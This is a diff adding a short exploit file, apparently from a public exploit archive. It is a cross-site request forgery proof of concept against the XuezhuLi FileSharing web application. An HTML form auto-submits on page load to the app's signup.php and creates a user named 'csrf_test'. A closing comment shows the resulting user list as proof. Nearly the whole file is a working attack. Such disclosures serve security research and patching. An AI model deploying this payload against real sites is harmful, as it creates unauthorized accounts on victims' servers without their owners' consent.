@@ -1,0 +1,27 @@
+<!--	
+# Exploit Title: XuezhuLi FileSharing - CSRF(Add User)
+# Date: 2016-06-23
+# Exploit Author: HaHwul
+# Exploit Author Blog: www.hahwul.com
+# Vendor Homepage: https://github.com/XuezhuLi
+# Software Link: https://github.com/XuezhuLi/FileSharing/archive/master.zip
+# Version: Latest commit
+# Tested on: Debian [wheezy]
+-->
+
+<form name="csrf_poc" action="http://127.0.0.1/vul_test/FileSharing/signup.php" method="POST">
+<input type="hidden" name="sign" value="ok">
+<input type="hidden" name="newuser" value="csrf_test">
+
+<input type="submit" value="Replay!">
+</form>
+
+<script type="text/javascript">document.forms.csrf_poc.submit();</script>
+
+<!--
+Output.
+#> cat /srv/userlists.txt 
+aaaa
+csrf_test
+
+-->
